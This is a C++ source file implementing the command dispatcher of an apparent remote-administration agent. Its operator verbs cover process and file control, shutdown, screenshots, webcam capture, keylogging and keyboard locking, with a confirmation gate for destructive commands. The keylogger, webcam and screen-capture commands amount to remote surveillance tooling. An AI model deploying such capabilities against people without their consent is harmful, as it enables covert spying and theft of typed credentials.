// lib/syscalls/matrix.cpp - the matrix data and the dispatch layer's
// implementation (task 6.1), plus the family glue for the families
// implemented in this build: process (task 6.2), file (task 6.3), power
// (task 6.4), capture (task 6.5), camera (task 6.6), input (task 6.7) and
// app (task 6.8). The glue owns only argument-shape validation and result
// formatting; every system effect goes through the family interface as
// typed data.
#include "matrix.hpp"

#include "app.hpp"
#include "camera.hpp"
#include "capture.hpp"
#include "input.hpp"
#include "power.hpp"

#include <algorithm>
#include <stdexcept>

namespace tether::syscalls {

namespace {

// ---- the closed set ----------------------------------------------------------

// clang-format off: one row per line keeps the verb -> family/support shape
// auditable against the remote-commands delta's command list (19 rows).
const std::vector<CommandSpec> kCommandSet = {
    // process family (task 6.2): list/start/stop.
    {"list",            Family::Process, false, true, true},
    {"start",           Family::Process, false, true, true},
    {"stop",            Family::Process, false, true, true},
    // file family (task 6.3): list/delete/move/copy. `move`/`copy` are
    // destructive (both replace destinations) at the agent layer per the
    // task 6.3 confirm-handling binding; `delete` per the remote-commands
    // delta's file-deletion gate.
    {"ls",              Family::File,    false, true, true},
    {"delete",          Family::File,    true,  true, true},
    {"move",            Family::File,    true,  true, true},
    {"copy",            Family::File,    true,  true, true},
    // power family (task 6.4): ExitWindowsEx on Windows, logind over D-Bus
    // on Linux; destructive rows live behind the agent-layer confirm gate.
    {"shutdown",        Family::Power,   true,  true, true},
    {"restart",         Family::Power,   true,  true, true},
    // capture family (task 6.5): GDI BitBlt on Windows, X11 XGetImage on
    // Linux; a Wayland-only host is the structured no-display refusal.
    {"screenshot",      Family::Capture, false, true, true},
    // camera family (task 6.6): managed background jobs over the shared
    // registry (jobs.hpp), cv::VideoCapture as the production source.
    {"start_webcam",    Family::Camera,  false, true, true},
    {"stop_webcam",     Family::Camera,  false, true, true},
    // input family (task 6.7): Windows first, X11 on Linux; Wayland gaps
    // resolve through the matrix like everything else.
    {"start_keylogger", Family::Input,   false, true, true},
    {"stop_keylogger",  Family::Input,   false, true, true},
    {"lock_keyboard",   Family::Input,   false, true, true},
    {"unlock_keyboard", Family::Input,   false, true, true},
    // app family (task 6.8): Start-menu shortcuts / .desktop entries.
    {"list_app",        Family::App,     false, true, true},
    {"start_app",       Family::App,     false, true, true},
    {"stop_app",        Family::App,     false, true, true},
};

Outcome refuse(const std::string& code, const std::string& message) {
    Outcome refusal;
    refusal.ok = false;
    refusal.code = code;
    refusal.message = message;
    return refusal;
}

std::string unsupported_message(const CommandSpec& spec, Platform platform,
                                const std::string& why) {
    return "'" + std::string(spec.verb) + "' is not supported on " +
           platform_name(platform) + " (family " + family_name(spec.family) +
           "): " + why;
}

bool is_all_digits(const std::string& text) {
    return !text.empty() &&
           std::all_of(text.begin(), text.end(), [](char c) {
               return c >= '0' && c <= '9';
           });
}

// Exact-match lookup against `table` (the same closed-verb rule as
// find_command, but scoped to the dispatcher's OWN table - the default
// table is exactly command_set(), while tests may pin rows per platform).
const CommandSpec* find_in(const std::vector<CommandSpec>& table, const std::string& verb) {
    for (const CommandSpec& spec : table) {
        if (verb == spec.verb) {
            return &spec;
        }
    }
    return nullptr; // outside the closed set - exact match or nothing
}

// A pid parses exactly, with no leading/trailing overflow past uint32.
bool try_parse_pid(const std::string& text, std::uint32_t& pid) {
    if (text.size() > 10 || !is_all_digits(text)) {
        return false;
    }
    try {
        const unsigned long value = std::stoul(text);
        if (value > 0xFFFFFFFFul) {
            return false;
        }
        pid = static_cast<std::uint32_t>(value);
        return true;
    } catch (const std::exception&) {
        return false;
    }
}

// ---- family glue: process (task 6.2) ---------------------------------------

Outcome process_list(IProcessControl& control, const std::vector<std::string>& args) {
    if (!args.empty()) {
        throw SyscallError("invalid_args",
                           "list takes no arguments, got " + std::to_string(args.size()));
    }
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    for (const ProcessInfo& info : control.list()) {
        outcome.lines.push_back(std::to_string(info.pid) + " " + info.name);
    }
    return outcome;
}

// argv flows to the launcher as literal data by construction here; the
// task 6.2 test proves the same property end to end with a real child.
Outcome process_start(IProcessControl& control, const std::vector<std::string>& argv) {
    if (argv.empty()) {
        throw SyscallError("invalid_args",
                           "start needs at least the program to run as its first argument");
    }
    const std::uint32_t pid = control.start(argv);
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("started pid " + std::to_string(pid));
    return outcome;
}

// stop addresses a process by pid, or by exact image name (v1 parity: exit
// codes were returned for image-not-found; here that is the structured
// "not_found" outcome).
Outcome process_stop(IProcessControl& control, const std::vector<std::string>& args) {
    if (args.size() != 1) {
        throw SyscallError("invalid_args",
                           "stop needs exactly one argument: a pid or a process name");
    }
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.message = "stopped";
    if (is_all_digits(args[0])) {
        std::uint32_t pid = 0;
        try_parse_pid(args[0], pid);
        if (pid == 0) {
            throw SyscallError("invalid_args", "pid 0 cannot be signalled");
        }
        control.stop(pid);
        outcome.lines.push_back("stopped pid " + args[0]);
        return outcome;
    }
    std::vector<std::uint32_t> matching;
    for (const ProcessInfo& info : control.list()) {
        if (info.name == args[0]) {
            matching.push_back(info.pid);
        }
    }
    if (matching.empty()) {
        throw SyscallError("not_found", "no process named '" + args[0] + "'");
    }
    for (const std::uint32_t pid : matching) {
        control.stop(pid);
        outcome.lines.push_back("stopped pid " + std::to_string(pid) + " ('" + args[0] + "')");
    }
    return outcome;
}

// ---- family glue: file (task 6.3) -------------------------------------------

Outcome file_ls(IFileSystem& filesystem, const std::vector<std::string>& args) {
    if (args.size() > 1) {
        throw SyscallError("invalid_args",
                           "ls takes at most one argument (a directory path), got " +
                               std::to_string(args.size()));
    }
    const std::string& directory = args.empty() ? std::string(".") : args[0];
    std::vector<FileEntry> entries = filesystem.list(directory);
    std::sort(entries.begin(), entries.end(), [](const FileEntry& a, const FileEntry& b) {
        return a.name < b.name; // deterministic listings (the interface already sorts)
    });
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.message = "listed " + directory;
    for (const FileEntry& entry : entries) {
        outcome.lines.push_back(entry.is_directory ? entry.name + "/"
                                                 : entry.name + " " + std::to_string(entry.size));
    }
    return outcome;
}

Outcome file_delete(IFileSystem& filesystem, const std::vector<std::string>& argv) {
    if (argv.size() != 1) {
        throw SyscallError("invalid_args",
                           "delete needs exactly one argument: the path to remove");
    }
    filesystem.remove(argv[0]);
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("deleted " + argv[0]);
    return outcome;
}

Outcome file_move(IFileSystem& filesystem, const std::vector<std::string>& argv) {
    if (argv.size() != 2) {
        throw SyscallError("invalid_args", "move needs exactly two arguments: source and destination");
    }
    filesystem.move(argv[0], argv[1]);
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("moved " + argv[0] + " -> " + argv[1]);
    return outcome;
}

Outcome file_copy(IFileSystem& filesystem, const std::vector<std::string>& argv) {
    if (argv.size() != 2) {
        throw SyscallError("invalid_args", "copy needs exactly two arguments: source and destination");
    }
    filesystem.copy(argv[0], argv[1]);
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("copied " + argv[0] + " -> " + argv[1]);
    return outcome;
}

// ---- family glue: power (task 6.4) -------------------------------------------
//
// The dispatcher's step 4 already held every unconfirmed destructive call
// (the gate is live for `shutdown`/`restart` rows since task 6.1); the glue
// running here means the token WAS present - the family performs the
// authorized request and the outcome reports its result.

Outcome power_shutdown(IPowerControl& control, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "shutdown takes no arguments beyond the confirmation token, got " +
                               std::to_string(argv.size()));
    }
    control.shutdown();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("shutdown initiated");
    outcome.lines.push_back("the operating system owns the transition from here");
    return outcome;
}

Outcome power_restart(IPowerControl& control, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "restart takes no arguments beyond the confirmation token, got " +
                               std::to_string(argv.size()));
    }
    control.restart();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("restart initiated");
    outcome.lines.push_back("the operating system owns the transition from here");
    return outcome;
}

// ---- family glue: capture (task 6.5) ------------------------------------------

Outcome capture_screenshot(IScreenCapture& control, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "screenshot takes no arguments, got " + std::to_string(argv.size()));
    }
    // The family returns the byte-complete, named PNG; the session layer
    // streams it through the FILE_META/FILE_CHUNK/FILE_END channel.
    const Outcome::Deliverable deliverable = control.grab();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("captured the screen as " + deliverable.name);
    outcome.file = deliverable;
    return outcome;
}

// ---- family glue: camera (task 6.6) --------------------------------------------

Outcome camera_start(ICameraCapture& control, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "start_webcam takes no arguments, got " + std::to_string(argv.size()));
    }
    // Occupied slot -> the structured already-running refusal (the running
    // job is untouched - spec: "duplicate start is refused with a
    // structured result").
    control.start_job();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("camera job started");
    outcome.lines.push_back("the capture runs in the background; stop_webcam stops it and delivers the image");
    return outcome;
}

Outcome camera_stop(ICameraCapture& control, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "stop_webcam takes no arguments, got " + std::to_string(argv.size()));
    }
    // "job stop releases and delivers the accumulated capture": the stop
    // terminates the job's thread and the latest frame rides outcome.file
    // (byte-complete + named). Nothing running / a failed job throws the
    // not_running / execute_failed classifications.
    const Outcome::Deliverable deliverable = control.stop_job();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("camera job stopped; delivered " + deliverable.name);
    outcome.file = deliverable;
    return outcome;
}

// ---- family glue: input (task 6.7) -------------------------------------------
//
// Authorized-use framing, operator-facing: all four verbs are explicit
// console commands that the console-side audit trail records (task 6.9);
// nothing in this family starts on its own, and the lock is a reversible
// engage/release pair the operator drives. A started keylogger announces a
// machine-readable job event (the established convention: job events ride
// JSON in RESULT payloads) so the console audit records the job lifecycle
// without any new wire type.

Outcome input_start_keylogger(IInputControl& control, const std::vector<std::string>& argv) {
    if (argv.size() > 1) {
        throw SyscallError(
            "invalid_args",
            "start_keylogger takes at most one argument (the capture storage path), got " +
                std::to_string(argv.size()));
    }
    // The storage path is the start command's one configurable parameter
    // (the family's start refuses an unopenable path before seating the
    // job - the refusal surfaces from the call as a classified SyscallError).
    const std::string storage = argv.empty() ? std::string(kDefaultCaptureStorage) : argv.front();
    control.start_keylogger(storage);
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("keylogger job started");
    outcome.lines.push_back("the capture accumulates to " + storage +
                            "; stop_keylogger stops it and delivers the file");
    outcome.lines.push_back("{\"tether_job_event\":{\"job\":\"input\",\"event\":\"started\"}}");
    return outcome;
}

// The accumulated capture rides outcome.file (byte-complete + named; an
// empty capture is an honest zero-byte file). The console's stopped job
// event derives from the verb + the delivered FILE_META name: the agent
// wire carries the file-only stream for deliverable results (the same
// shape stop_webcam already produces).
Outcome input_stop_keylogger(IInputControl& control, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "stop_keylogger takes no arguments, got " + std::to_string(argv.size()));
    }
    const Outcome::Deliverable deliverable = control.stop_keylogger();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("keylogger job stopped; delivered " + deliverable.name);
    outcome.file = deliverable;
    return outcome;
}

Outcome input_lock(IInputControl& control, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "lock_keyboard takes no arguments, got " + std::to_string(argv.size()));
    }
    control.lock_keyboard();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("keyboard locked");
    outcome.lines.push_back("unlock_keyboard releases the lock");
    return outcome;
}

Outcome input_unlock(IInputControl& control, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "unlock_keyboard takes no arguments, got " + std::to_string(argv.size()));
    }
    control.unlock_keyboard();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("keyboard unlocked");
    return outcome;
}

// ---- family glue: app (task 6.8) ----------------------------------------------

Outcome app_list(IAppLauncher& launcher, const std::vector<std::string>& argv) {
    if (!argv.empty()) {
        throw SyscallError("invalid_args",
                           "list_app takes no arguments, got " + std::to_string(argv.size()));
    }
    const std::vector<AppEntry> entries = launcher.list();
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.message = "listed " + std::to_string(entries.size()) + " applications";
    for (const AppEntry& entry : entries) {
        outcome.lines.push_back(entry.name + " " + entry.path);
    }
    return outcome;
}

Outcome app_start(IAppLauncher& launcher, const std::vector<std::string>& argv) {
    if (argv.size() != 1) {
        throw SyscallError("invalid_args",
                           "start_app needs exactly one argument: the application name from list_app");
    }
    const std::uint32_t pid = launcher.start(argv[0]);
    Outcome outcome;
    outcome.ok = true;
    outcome.code = "ok";
    outcome.lines.push_back("started pid " + std::to_string(pid));
    return outcome;
}

// stop_app addresses a child BY pid or by process image name - the exact
// resolution the process family's stop serves, shared because the agent
// wires ONE process control across both families (see app.hpp). A launch
// name and its backing image name can differ; the pid form from start_app
// always works.
Outcome app_stop(IProcessControl& processes, const std::vector<std::string>& argv) {
    if (argv.size() != 1) {
        throw SyscallError("invalid_args",
                           "stop_app needs exactly one argument: a pid or a process name");
    }
    return process_stop(processes, argv);
}

} // namespace

// ---- matrix accessors ---------------------------------------------------------

const std::vector<CommandSpec>& command_set() { return kCommandSet; }

const CommandSpec* find_command(const std::string& verb) {
    for (const CommandSpec& spec : command_set()) {
        if (verb == spec.verb) {
            return &spec;
        }
    }
    return nullptr; // outside the closed set - exact match or nothing
}

bool supported_on(const CommandSpec& spec, Platform platform) {
    switch (platform) {
        case Platform::Windows: return spec.on_windows;
        case Platform::Linux: return spec.on_linux;
    }
    return false;
}

const char* platform_name(Platform platform) {
    switch (platform) {
        case Platform::Windows: return "windows";
        case Platform::Linux: return "linux";
    }
    return "unknown";
}

const char* family_name(Family family) {
    switch (family) {
        case Family::Process: return "process";
        case Family::File: return "file";
        case Family::Power: return "power";
        case Family::Capture: return "capture";
        case Family::Camera: return "camera";
        case Family::App: return "app";
        case Family::Input: return "input";
    }
    return "unknown";
}

Platform current_platform() {
#if defined(_WIN32)
    return Platform::Windows;
#else
    return Platform::Linux;
#endif
}

// ---- the dispatcher ------------------------------------------------------------

CommandDispatcher::CommandDispatcher(Platform platform,
                                     const std::vector<CommandSpec>& table)
    : platform_(platform), table_(table) {}

void CommandDispatcher::set_process_control(std::shared_ptr<IProcessControl> impl) {
    process_ = std::move(impl);
}

void CommandDispatcher::set_file_system(std::shared_ptr<IFileSystem> impl) {
    file_ = std::move(impl);
}

void CommandDispatcher::set_power_control(std::shared_ptr<IPowerControl> impl) {
    power_ = std::move(impl);
}

void CommandDispatcher::set_screen_capture(std::shared_ptr<IScreenCapture> impl) {
    capture_ = std::move(impl);
}

void CommandDispatcher::set_camera_capture(std::shared_ptr<ICameraCapture> impl) {
    camera_ = std::move(impl);
}

void CommandDispatcher::set_input_control(std::shared_ptr<IInputControl> impl) {
    input_ = std::move(impl);
}

void CommandDispatcher::set_app_launcher(std::shared_ptr<IAppLauncher> impl) {
    app_ = std::move(impl);
}

bool CommandDispatcher::family_available(Family family) const {
    switch (family) {
        case Family::Process: return process_ != nullptr;
        case Family::File: return file_ != nullptr;
        case Family::Power: return power_ != nullptr;
        case Family::Capture: return capture_ != nullptr;
        case Family::Camera: return camera_ != nullptr;
        case Family::Input: return input_ != nullptr;
        case Family::App: return app_ != nullptr;
        default: return false; // never reached with all seven enumerated
    }
}

Outcome CommandDispatcher::dispatch(const std::string& verb,
                                    const std::vector<std::string>& args) const try {
    // 1. The closed set, honoured against the dispatcher's OWN table: the
    // default table is exactly command_set(), so wired behavior is the
    // production closed set; an injected table (tests pin platform rows)
    // is what the platform gap resolves through. Rejection happens here,
    // BEFORE any capability is touched, so an unknown verb has no system
    // effect by construction. The structured error names the offending
    // verb (remote-commands delta).
    const CommandSpec* spec = find_in(table_, verb);
    if (spec == nullptr) {
        return refuse("unknown_command", "unknown command '" + verb + "'");
    }

    // 2. The matrix row: a declared platform gap resolves to exactly one
    // structured refusal naming the platform and the family (the spec's
    // out-of-matrix scenario), and the session continues with the next
    // command - nothing here can wedge or crash.
    if (!supported_on(*spec, platform_)) {
        return refuse("unsupported_platform",
                      unsupported_message(*spec, platform_, "it is outside this platform's matrix"));
    }

    // 3. Family availability: a known-and-supported verb whose implementation
    // does not exist yet (family tasks 6.4-6.8) resolves to the same
    // structured unsupported outcome until its family lands.
    if (!family_available(spec->family)) {
        return refuse(
            "unsupported_platform",
            unsupported_message(*spec, platform_, "the family is not implemented in this build yet"));
    }

    // 4. The agent-layer confirmation gate (spec: destructive commands carry
    // explicit authorization; the operator side refuses unconfirmed sends).
    // Nothing past this point runs for an unconfirmed destructive command -
    // tests prove zero disk/system side effects behind each refusal.
    std::vector<std::string> argv = args;
    if (spec->destructive) {
        if (argv.empty() || argv.front() != kConfirmMarker) {
            return refuse("missing_confirmation",
                          "'" + std::string(spec->verb) + "' is destructive and requires '" +
                              kConfirmMarker + "' as its first argument; nothing was executed");
        }
        argv.erase(argv.begin()); // families see the operational argv only
    }

    // 5. Family execution: every path returns success or a classified
    // failure (SyscallError codes; anything unexpected resolves to
    // "internal_error" so no command can end unclassified).
    switch (spec->family) {
        case Family::Process:
            if (verb == "list") {
                return process_list(*process_, argv);
            }
            if (verb == "start") {
                return process_start(*process_, argv);
            }
            return process_stop(*process_, argv);
        case Family::File:
            if (verb == "ls") {
                return file_ls(*file_, argv);
            }
            if (verb == "delete") {
                return file_delete(*file_, argv);
            }
            if (verb == "move") {
                return file_move(*file_, argv);
            }
            return file_copy(*file_, argv);
        case Family::Power:
            // Unreachable with null families: step 3 refused first.
            if (verb == "shutdown") {
                return power_shutdown(*power_, argv);
            }
            return power_restart(*power_, argv);
        case Family::Capture:
            return capture_screenshot(*capture_, argv);
        case Family::Camera:
            if (verb == "start_webcam") {
                return camera_start(*camera_, argv);
            }
            return camera_stop(*camera_, argv);
        case Family::Input:
            if (verb == "start_keylogger") {
                return input_start_keylogger(*input_, argv);
            }
            if (verb == "stop_keylogger") {
                return input_stop_keylogger(*input_, argv);
            }
            if (verb == "lock_keyboard") {
                return input_lock(*input_, argv);
            }
            return input_unlock(*input_, argv);
        case Family::App:
            if (verb == "list_app") {
                return app_list(*app_, argv);
            }
            if (verb == "start_app") {
                return app_start(*app_, argv);
            }
            // stop_app reuses the process family's shared stop (same
            // IProcessControl the agent wires across both families). The
            // app family itself is a non-null slot here (step 3 refused
            // that); the process-null guard covers an app-launcher-only
            // wiring with a classified failure instead of dereferencing.
            if (process_ == nullptr) {
                return refuse("execute_failed",
                              "'stop_app' needs the shared process control, which is not wired");
            }
            return app_stop(*process_, argv);
        default:
            break;
    }
    return refuse("internal_error", "'" + verb + "' reached a family with no dispatch path");
}
catch (const SyscallError& error) {
    return refuse(error.code(), error.what());
}
catch (const std::exception& error) {
    return refuse("internal_error", error.what());
}

} // namespace tether::syscalls
